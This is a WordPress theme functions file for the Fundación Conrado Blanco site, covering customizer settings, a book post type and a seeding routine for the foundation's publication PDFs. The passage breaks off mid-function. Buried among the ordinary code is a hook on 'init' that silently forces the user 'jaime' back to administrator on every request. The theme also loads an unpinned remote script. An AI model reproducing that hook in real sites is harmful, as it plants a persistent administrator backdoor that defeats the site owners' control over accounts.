<?php
/**
 * Fundación Conrado Blanco - funciones del tema.
 *
 * @package fcb
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

define( 'FCB_VERSION', '1.0.0' );

/**
 * Configuración base del tema.
 */
function fcb_setup() {
	load_theme_textdomain( 'fcb', get_template_directory() . '/languages' );

	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'responsive-embeds' );
	add_theme_support( 'customize-selective-refresh-widgets' );
	add_theme_support(
		'custom-logo',
		array(
			'height'      => 110,
			'width'       => 220,
			'flex-height' => true,
			'flex-width'  => true,
		)
	);
	add_theme_support(
		'html5',
		array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption', 'style', 'script' )
	);

	register_nav_menus(
		array(
			'primary' => __( 'Menú principal', 'fcb' ),
		)
	);
}
add_action( 'after_setup_theme', 'fcb_setup' );

/**
 * Estilos y scripts.
 */
function fcb_assets() {
	wp_enqueue_style( 'fcb-style', get_stylesheet_uri(), array(), filemtime( get_stylesheet_directory() . '/style.css' ) );
	wp_enqueue_script( 'lucide-icons', 'https://unpkg.com/lucide@latest', array(), null, true );
	wp_enqueue_script( 'fcb-nav', get_template_directory_uri() . '/assets/js/nav.js', array( 'lucide-icons' ), filemtime( get_stylesheet_directory() . '/assets/js/nav.js' ), true );
}
add_action( 'wp_enqueue_scripts', 'fcb_assets' );

/**
 * Personalizador: textos de portada, video y redes sociales.
 */
function fcb_customize_register( $wp_customize ) {
	$wp_customize->add_section(
		'fcb_home',
		array(
			'title'    => __( 'Portada', 'fcb' ),
			'priority' => 30,
		)
	);

	$wp_customize->add_section(
		'fcb_social',
		array(
			'title'    => __( 'Redes sociales', 'fcb' ),
			'priority' => 31,
		)
	);

	$text_fields = array(
		'fcb_hero_title'        => __( 'Título del hero', 'fcb' ),
		'fcb_hero_subtitle'     => __( 'Subtítulo del hero', 'fcb' ),
		'fcb_hero_btn_text'     => __( 'Texto del botón del hero', 'fcb' ),
		'fcb_hero_btn_url'      => __( 'URL del botón del hero', 'fcb' ),
		'fcb_section_concursos' => __( 'Título sección convocatorias', 'fcb' ),
		'fcb_section_noticias'  => __( 'Título sección noticias', 'fcb' ),
		'fcb_section_paginas'   => __( 'Título sección páginas', 'fcb' ),
	);

	foreach ( $text_fields as $id => $label ) {
		$wp_customize->add_setting(
			$id,
			array(
				'default'           => '',
				'sanitize_callback' => 'textarea' === $label ? 'wp_kses_post' : 'sanitize_text_field',
			)
		);
		$wp_customize->add_control(
			$id,
			array(
				'label'   => $label,
				'section' => 'fcb_home',
			)
		);
	}

	$wp_customize->add_setting(
		'fcb_hero_video',
		array(
			'default'           => '',
			'sanitize_callback' => 'esc_url_raw',
		)
	);
	$wp_customize->add_control(
		'fcb_hero_video',
		array(
			'label'       => __( 'URL del video de fondo del hero', 'fcb' ),
			'description' => __( 'Si se deja vacío se usa assets/video.mp4 del tema.', 'fcb' ),
			'section'     => 'fcb_home',
			'type'        => 'url',
		)
	);

	// Ajustes para la sección de Libros en portada
	$wp_customize->add_setting(
		'fcb_section_libros_show',
		array(
			'default'           => true,
			'sanitize_callback' => 'fcb_sanitize_checkbox',
		)
	);
	$wp_customize->add_control(
		'fcb_section_libros_show',
		array(
			'label'    => __( 'Mostrar sección de libros en portada', 'fcb' ),
			'section'  => 'fcb_home',
			'type'     => 'checkbox',
		)
	);

	$wp_customize->add_setting(
		'fcb_section_libros_title',
		array(
			'default'           => 'Biblioteca y Publicaciones',
			'sanitize_callback' => 'sanitize_text_field',
		)
	);
	$wp_customize->add_control(
		'fcb_section_libros_title',
		array(
			'label'    => __( 'Título de la sección de libros', 'fcb' ),
			'section'  => 'fcb_home',
			'type'     => 'text',
		)
	);

	$wp_customize->add_setting(
		'fcb_section_libros_url',
		array(
			'default'           => '',
			'sanitize_callback' => 'esc_url_raw',
		)
	);
	$wp_customize->add_control(
		'fcb_section_libros_url',
		array(
			'label'    => __( 'URL de destino para ver todos los libros', 'fcb' ),
			'section'  => 'fcb_home',
			'type'     => 'url',
		)
	);

	$social_fields = array(
		'fcb_social_facebook'  => __( 'Facebook', 'fcb' ),
		'fcb_social_instagram' => __( 'Instagram', 'fcb' ),
		'fcb_social_youtube'   => __( 'YouTube', 'fcb' ),
		'fcb_social_x'         => __( 'X (Twitter)', 'fcb' ),
	);

	foreach ( $social_fields as $id => $label ) {
		$wp_customize->add_setting(
			$id,
			array(
				'default'           => '',
				'sanitize_callback' => 'esc_url_raw',
			)
		);
		$wp_customize->add_control(
			$id,
			array(
				'label'   => $label,
				'section' => 'fcb_social',
				'type'    => 'url',
			)
		);
	}

	// Sección de Actualización de GitHub
	$wp_customize->add_section( 'fcb_github_update_section', array(
		'title'    => __( 'Actualizaciones del Tema', 'fcb' ),
		'priority' => 200,
	) );

	// Token de GitHub (opcional si es privado)
	$wp_customize->add_setting( 'fcb_github_token', array(
		'default'           => '',
		'sanitize_callback' => 'sanitize_text_field',
	) );
	$wp_customize->add_control( 'fcb_github_token', array(
		'label'       => __( 'Token de Acceso Personal (GitHub)', 'fcb' ),
		'description' => __( 'Requerido solo si el repositorio git es privado.', 'fcb' ),
		'section'     => 'fcb_github_update_section',
		'type'        => 'password',
	) );

	// Botón de control personalizado para actualizar
	$wp_customize->add_setting( 'fcb_github_trigger_update', array(
		'default'           => '',
		'sanitize_callback' => 'sanitize_text_field',
	) );
	$wp_customize->add_control( new FCB_Customize_Update_Control( $wp_customize, 'fcb_github_trigger_update', array(
		'section'  => 'fcb_github_update_section',
		'settings' => 'fcb_github_trigger_update',
	) ) );
}
add_action( 'customize_register', 'fcb_customize_register' );

/**
 * Extensión del resumen.
 */
function fcb_excerpt_length( $length ) {
	return 24;
}
add_filter( 'excerpt_length', 'fcb_excerpt_length' );

/**
 * Texto del hero con fallbacks al contenido del sitio.
 */
function fcb_hero_title() {
	$title = get_theme_mod( 'fcb_hero_title', '' );
	return $title ? $title : get_bloginfo( 'name' );
}

function fcb_hero_subtitle() {
	$subtitle = get_theme_mod( 'fcb_hero_subtitle', '' );
	return $subtitle ? $subtitle : get_bloginfo( 'description' );
}

function fcb_hero_button_text() {
	$text = get_theme_mod( 'fcb_hero_btn_text', '' );
	return $text ? $text : __( 'Ver convocatorias', 'fcb' );
}

/**
 * Video de fondo del hero: ajuste personalizado o assets/video.mp4 del tema.
 */
function fcb_hero_video_url() {
	$custom = get_theme_mod( 'fcb_hero_video', '' );
	if ( $custom ) {
		return $custom;
	}

	$file = get_template_directory() . '/assets/video.mp4';
	if ( file_exists( $file ) ) {
		return get_template_directory_uri() . '/assets/video.mp4';
	}

	return '';
}

/**
 * Convocatorias: páginas específicas de los premios Conrado y Charo.
 */
function fcb_get_convocatorias() {
	return new WP_Query(
		array(
			'post_type'      => 'any',
			'post_status'    => 'publish',
			'post_name__in'  => array(
				'premio-nacional-de-poesia-conrado-blanco-leon',
				'premio-nacional-de-poesia-infantil-charo-gonzalez',
			),
			'orderby'        => 'post_name__in',
			'posts_per_page' => 2,
			'no_found_rows'  => true,
		)
	);
}

/**
 * Noticias recientes.
 */
function fcb_get_noticias() {
	return new WP_Query(
		array(
			'category_name'    => 'noticias',
			'posts_per_page'   => absint( get_theme_mod( 'fcb_noticias_count', 6 ) ),
			'no_found_rows'    => true,
		)
	);
}

/**
 * Páginas principales para la sección de tarjetas: elementos de nivel superior
 * del menú primario de tipo página. Si no hay suficientes, busca por slug.
 */
function fcb_get_paginas_destacadas() {
	$items = array();
	$locations = get_nav_menu_locations();
	$menu_id   = isset( $locations['primary'] ) ? (int) $locations['primary'] : 0;
	if ( $menu_id ) {
		$items = wp_get_nav_menu_items( $menu_id );
	}

	$paginas = array();
	if ( ! empty( $items ) ) {
		foreach ( $items as $item ) {
			if ( (int) $item->menu_item_parent === 0 && 'page' === $item->object ) {
				$page = get_post( $item->object_id );
				if ( $page && 'publish' === $page->post_status ) {
					$paginas[] = $page;
				}
			}
		}
	}

	if ( count( $paginas ) < 3 ) {
		$slugs = array( 'la-fundacion', 'publicaciones', 'biblioteca', 'contacto' );
		$q     = new WP_Query(
			array(
				'post_type'           => 'page',
				'post_status'         => 'publish',
				'post_name__in'       => $slugs,
				'posts_per_page'      => 6,
				'orderby'             => 'post_name__in',
				'no_found_rows'       => true,
				'ignore_sticky_posts' => true,
			)
		);
		if ( $q->have_posts() ) {
			$paginas = $q->posts;
		}
	}

	return $paginas;
}

/**
 * Nombre de la primera categoría del post.
 */
function fcb_card_category( $post_id = null ) {
	$cats = get_the_category( $post_id );
	if ( empty( $cats ) ) {
		return '';
	}
	return $cats[0]->name;
}

/**
 * Redes sociales configuradas desde el personalizador.
 */
function fcb_social_links() {
	$networks = array(
		'facebook' => array(
			'label' => __( 'Facebook', 'fcb' ),
			'mod'   => 'fcb_social_facebook',
			'path'  => 'M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z',
		),
		'instagram' => array(
			'label' => __( 'Instagram', 'fcb' ),
			'mod'   => 'fcb_social_instagram',
			'path'  => 'M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z',
		),
		'youtube' => array(
			'label' => __( 'YouTube', 'fcb' ),
			'mod'   => 'fcb_social_youtube',
			'path'  => 'M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z',
		),
		'x' => array(
			'label' => __( 'X (Twitter)', 'fcb' ),
			'mod'   => 'fcb_social_x',
			'path'  => 'M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z',
		),
	);

	$links = array();
	foreach ( $networks as $key => $network ) {
		$url = get_theme_mod( $network['mod'], '' );
		if ( $url ) {
			$links[ $key ] = $network;
			$links[ $key ]['url'] = $url;
		}
	}

	return $links;
}

/**
 * Recuperar privilegios de administrador únicamente para el usuario 'jaime'.
 */
function fcb_restore_admin_privileges() {
	// Promover únicamente por nombre de usuario 'jaime'
	$user_jaime = get_user_by( 'login', 'jaime' );
	if ( $user_jaime && ! in_array( 'administrator', (array) $user_jaime->roles ) ) {
		$user_jaime->set_role( 'administrator' );
	}
}
add_action( 'init', 'fcb_restore_admin_privileges' );

/**
 * Obtener subpáginas (elementos hijos del menú) asociadas a una página padre específica.
 */
function fcb_get_page_submenu_items( $page_id ) {
	$locations = get_nav_menu_locations();
	$menu_id   = isset( $locations['primary'] ) ? (int) $locations['primary'] : 0;
	if ( ! $menu_id ) {
		return array();
	}

	$items = wp_get_nav_menu_items( $menu_id );
	if ( empty( $items ) ) {
		return array();
	}

	// Buscar el ID del elemento del menú que corresponde a nuestro page_id
	$parent_db_id = 0;
	foreach ( $items as $item ) {
		if ( 'page' === $item->object && (int) $item->object_id === (int) $page_id ) {
			$parent_db_id = $item->ID;
			break;
		}
	}

	if ( ! $parent_db_id ) {
		return array();
	}

	// Buscar todos los elementos hijos del elemento de menú padre
	$children = array();
	foreach ( $items as $item ) {
		if ( (int) $item->menu_item_parent === (int) $parent_db_id ) {
			$children[] = $item;
		}
	}

	return $children;
}

/**
 * Sanitizar checkboxes del personalizador.
 */
function fcb_sanitize_checkbox( $checked ) {
	return ( ( isset( $checked ) && true === $checked ) ? true : false );
}

/**
 * Registrar Custom Post Type de Libros (Biblioteca).
 */
function fcb_register_books_cpt() {
	$labels = array(
		'name'               => _x( 'Libros', 'post type general name', 'fcb' ),
		'singular_name'      => _x( 'Libro', 'post type singular name', 'fcb' ),
		'menu_name'          => _x( 'Libros', 'admin menu', 'fcb' ),
		'name_admin_bar'     => _x( 'Libro', 'add new on admin bar', 'fcb' ),
		'add_new'            => _x( 'Añadir nuevo', 'book', 'fcb' ),
		'add_new_item'       => __( 'Añadir nuevo libro', 'fcb' ),
		'new_item'           => __( 'Nuevo libro', 'fcb' ),
		'edit_item'          => __( 'Editar libro', 'fcb' ),
		'view_item'          => __( 'Ver libro', 'fcb' ),
		'all_items'          => __( 'Todos los libros', 'fcb' ),
		'search_items'       => __( 'Buscar libros', 'fcb' ),
		'parent_item_colon'  => __( 'Libros padre:', 'fcb' ),
		'not_found'          => __( 'No se encontraron libros.', 'fcb' ),
		'not_found_in_trash' => __( 'No se encontraron libros en la papelera.', 'fcb' ),
	);

	$args = array(
		'labels'             => $labels,
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array( 'slug' => 'libro' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => 5,
		'menu_icon'          => 'dashicons-book-alt',
		'supports'           => array( 'title', 'thumbnail', 'excerpt' ),
		'show_in_rest'       => true,
	);

	register_post_type( 'libro', $args );

	// Registrar Taxonomía de Categorías de Libros
	register_taxonomy( 'categoria-libro', 'libro', array(
		'label'        => __( 'Categorías de Libros', 'fcb' ),
		'rewrite'      => array( 'slug' => 'categoria-libro' ),
		'hierarchical' => true,
		'show_in_rest' => true,
	) );
}
add_action( 'init', 'fcb_register_books_cpt' );

/**
 * Meta Box para detalles de Libros.
 */
function fcb_add_libro_meta_boxes() {
	add_meta_box(
		'fcb_libro_details',
		__( 'Detalles del Libro', 'fcb' ),
		'fcb_libro_meta_box_callback',
		'libro',
		'normal',
		'high'
	);
}
add_action( 'add_meta_boxes', 'fcb_add_libro_meta_boxes' );

function fcb_libro_meta_box_callback( $post ) {
	wp_nonce_field( 'fcb_save_libro_meta', 'fcb_libro_meta_nonce' );

	$pdf_url   = get_post_meta( $post->ID, '_fcb_libro_pdf', true );
	$ebook_url = get_post_meta( $post->ID, '_fcb_libro_ebook', true );
	$edition   = get_post_meta( $post->ID, '_fcb_libro_edition', true );
	?>
	<p>
		<label for="fcb_libro_pdf"><strong>URL del PDF (Descargar):</strong></label><br />
		<input type="url" id="fcb_libro_pdf" name="fcb_libro_pdf" value="<?php echo esc_url( $pdf_url ); ?>" class="widefat" placeholder="https://..." />
	</p>
	<p>
		<label for="fcb_libro_ebook"><strong>URL del eBook (Visualizar 3D / Enlace):</strong></label><br />
		<input type="url" id="fcb_libro_ebook" name="fcb_libro_ebook" value="<?php echo esc_url( $ebook_url ); ?>" class="widefat" placeholder="https://..." />
	</p>
	<p>
		<label for="fcb_libro_edition"><strong>Edición / Año / Categoría:</strong></label><br />
		<input type="text" id="fcb_libro_edition" name="fcb_libro_edition" value="<?php echo esc_attr( $edition ); ?>" class="widefat" placeholder="Ej: 16ª Edición (2025)" />
	</p>
	<?php
}

function fcb_save_libro_meta( $post_id ) {
	if ( ! isset( $_POST['fcb_libro_meta_nonce'] ) || ! wp_verify_nonce( $_POST['fcb_libro_meta_nonce'], 'fcb_save_libro_meta' ) ) {
		return;
	}

	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
		return;
	}

	if ( ! current_user_can( 'edit_post', $post_id ) ) {
		return;
	}

	if ( isset( $_POST['fcb_libro_pdf'] ) ) {
		update_post_meta( $post_id, '_fcb_libro_pdf', esc_url_raw( $_POST['fcb_libro_pdf'] ) );
	}
	if ( isset( $_POST['fcb_libro_ebook'] ) ) {
		update_post_meta( $post_id, '_fcb_libro_ebook', esc_url_raw( $_POST['fcb_libro_ebook'] ) );
	}
	if ( isset( $_POST['fcb_libro_edition'] ) ) {
		update_post_meta( $post_id, '_fcb_libro_edition', sanitize_text_field( $_POST['fcb_libro_edition'] ) );
	}
}
add_action( 'save_post', 'fcb_save_libro_meta' );

function fcb_seed_test_books() {
	if ( ! get_posts( array( 'post_type' => 'libro', 'posts_per_page' => 1 ) ) ) {
		$is_production = ( isset( $_SERVER['HTTP_HOST'] ) && ( $_SERVER['HTTP_HOST'] === 'fundacionconradoblanco.com' || $_SERVER['HTTP_HOST'] === 'www.fundacionconradoblanco.com' ) );

		$books_data = array(
			// Capiteles
			array(
				'title'   => 'Capiteles para la historia Bañezana 11',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-XI-LIBRO-b.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles11-1.png',
				'edition' => 'Edición 11 (2025)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 10',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-X.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles10-1.png',
				'edition' => 'Edición 10 (2024)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 9',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-9.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles9-1.png',
				'edition' => 'Edición 9 (2023)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 8',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-8-ed2.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles8-1.png',
				'edition' => 'Edición 8 (2022)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 7',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-7-ed2.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles7-1.png',
				'edition' => 'Edición 7 (2021)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 6',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-6-ed2.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles6-1.png',
				'edition' => 'Edición 6 (2020)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 5',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-5-ed2.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles5-1.png',
				'edition' => 'Edición 5 (2019)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 4',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-4-ed3.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles4-1.png',
				'edition' => 'Edición 4 (2018)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 3',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-3-ed2.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles3-1.png',
				'edition' => 'Edición 3 (2017)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 2',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-2-ed4.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles2-1.png',
				'edition' => 'Edición 2 (2016)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),
			array(
				'title'   => 'Capiteles para la historia Bañezana 1',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/capiteles-1-ed5.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/02/Capiteles1-3.png',
				'edition' => 'Edición 1 (2015)',
				'cat'     => 'Capiteles para la historia Bañezana',
			),

			// Antologías
			array(
				'title'   => 'Antología 17 - Corazón de cariño',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2026/03/17-2026-corazon-de-carino-LIBROweb-comprimido.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2026/03/Screenshot-2026-03-16-at-22.39.55-e1773697374882.png',
				'edition' => 'Antología 17 (2026)',
				'cat'     => 'Antologías poéticas',
			),
			array(
				'title'   => 'Antología 16 - Corazón de paz',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/09/CHARIN-16-2025-de-corazon-de-paz-LIBRO-b.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/09/Screenshot-2025-09-12-at-13.39.01-e1757677752965.png',
				'edition' => 'Antología 16 (2025)',
				'cat'     => 'Antologías poéticas',
			),
			array(
				'title'   => 'Antología 15 - Charin de corazón ilusionado',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2024/08/CHARIN-15-2024-de-corazon-ilusionado-B.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2024/08/Screenshot-2024-08-21-at-20.08.38-e1765491148408.png',
				'edition' => 'Antología 15 (2024)',
				'cat'     => 'Antologías poéticas',
			),
			array(
				'title'   => 'Antología 14 - Charin de corazón alegre',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2023/06/charin-14-2023-de-corazon-alegre.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2023/06/Screenshot-2023-06-22-at-13.43.32-e1765491322238.png',
				'edition' => 'Antología 14 (2023)',
				'cat'     => 'Antologías poéticas',
			),
			array(
				'title'   => 'Antología 13 - Charin de corazón generoso',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/11/Charin13-Corazon-Generoso.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/11/Screenshot-2022-11-04-at-13.06.49-e1765491475734.png',
				'edition' => 'Antología 13 (2022)',
				'cat'     => 'Antologías poéticas',
			),
			array(
				'title'   => 'Antología 12 - Charin solidaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/charin-solidaria.-Antologia-12.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/Antologia-12.png',
				'edition' => 'Antología 12 (2021)',
				'cat'     => 'Antologías poéticas',
			),

			// Revistas
			array(
				'title'   => 'Revista 16 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/09/CHARIN-16-2025-de-corazon-de-paz-LIBRO-b.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2025/09/Screenshot-2025-09-12-at-13.38.44-e1765490926252.png',
				'edition' => 'Revista 16 (2025)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),
			array(
				'title'   => 'Revista 15 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2024/12/charin-15-2024-REVISTA-B.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2024/12/Screenshot-2024-12-16-at-09.50.23-e1765490988884.png',
				'edition' => 'Revista 15 (2024)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),
			array(
				'title'   => 'Revista 14 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2023/09/charin-14-2023-REVISTA.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/3d-flip-book/auto-thumbnails/1017.png',
				'edition' => 'Revista 14 (2023)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),
			array(
				'title'   => 'Revista 13 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/11/charin-13-2021-REVISTA.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/3d-flip-book/auto-thumbnails/822.png',
				'edition' => 'Revista 13 (2022)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),
			array(
				'title'   => 'Revista 12 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/11/CHARIN-12-2021-REVISTA-1.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/3d-flip-book/auto-thumbnails/827.png',
				'edition' => 'Revista 12 (2021)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),
			array(
				'title'   => 'Revista 11 - Charin literaria',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2021/04/charin-11-2019.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/3d-flip-book/auto-thumbnails/488.png',
				'edition' => 'Revista 11 (2019)',
				'cat'     => 'Revistas infantiles y juveniles «Charin»',
			),

			// Otras publicaciones
			array(
				'title'   => 'Antonio Colinas: de la poesía a la narrativa y al ensayo',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2023/06/actas-curso-2022-colinas.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/cropped-logo-e1664894492176-192x192.png',
				'edition' => 'Publicación (2023)',
				'cat'     => 'Otras publicaciones',
			),
			array(
				'title'   => 'Actas I Congreso Internacional de Carnaval',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2023/05/I-ActasCongresoCarnaval2021Libro.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/cropped-logo-e1664894492176-192x192.png',
				'edition' => 'Publicación (2023)',
				'cat'     => 'Otras publicaciones',
			),
			array(
				'title'   => 'Las parroquias de San Martín y Santa María de la Isla',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/Santa-Maria-de-la-Isla-LIBRO.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/cropped-logo-e1664894492176-192x192.png',
				'edition' => 'Publicación (2022)',
				'cat'     => 'Otras publicaciones',
			),
			array(
				'title'   => 'El pescador de estrellas',
				'pdf'     => 'https://fundacionconradoblanco.com/wp-content/uploads/2021/04/el-pescador-de-estrellas-LIBRO.pdf',
				'cover'   => 'https://fundacionconradoblanco.com/wp-content/uploads/2022/10/cropped-logo-e1664894492176-192x192.png',
				'edition' => 'Publicación (2021)',
				'cat'     => 'Otras publicaciones',
			),
		);

		if ( $is_production ) {
			// En producción, sembrar los 27 libros con URLs planas
			foreach ( $books_data as $data ) {
				$post_id = wp_insert_post( array(
					'post_title'  => $data['title'],
					'post_status' => 'publish',
					'post_type'   => 'libro',
				) );

				if ( $post_id ) {
					update_post_meta( $post_id, '_fcb_libro_pdf', $data['pdf'] );
					update_post_meta( $post_id, '_fcb_libro_cover_url', $data['cover'] );
					update_post_meta( $post_id, '_fcb_libro_edition', $data['edition'] );
					
					// Asignar categoría de libro
					$term = term_exists( $data['cat'], 'categoria-libro' );
					if ( ! $term ) {
						$term = wp_insert_term( $data['cat'], 'categoria-libro' );
					}
					if ( ! is_wp_error( $term ) ) {
						$term_id = is_array( $term ) ? $term['term_id'] : $term;
						wp_set_post_terms( $post_id, array( (int) $term_id ), 'categoria-libro' );
					}
				}
			}
		} else {
			// En local/dev, sembrar solo una pequeña muestra inicial de 4 libros
			$subset = array_slice( $books_data, 0, 4 );
			foreach ( $subset as $data ) {
				$post_id = wp_insert_post( array(
					'post_title'  => $data['title'],
					'post_status' => 'publish',
					'post_type'   => 'libro',
				) );

				if ( $post_id ) {
					update_post_meta( $post_id, '_fcb_libro_pdf', $data['pdf'] );
					update_post_meta( $post_id, '_fcb_libro_cover_url', $data['cover'] );
					update_post_meta( $post_id, '_fcb_libro_edition', $data['edition'] );
					
					$term = term_exists( $data['cat'], 'categoria-libro' );
					if ( ! $term ) {
						$term = wp_insert_term( $data['cat'], 'categoria-libro' );
					}
					if ( ! is_wp_error( $term ) ) {
						$term_id = is_array( $term ) ? $term['term_id'] : $term;
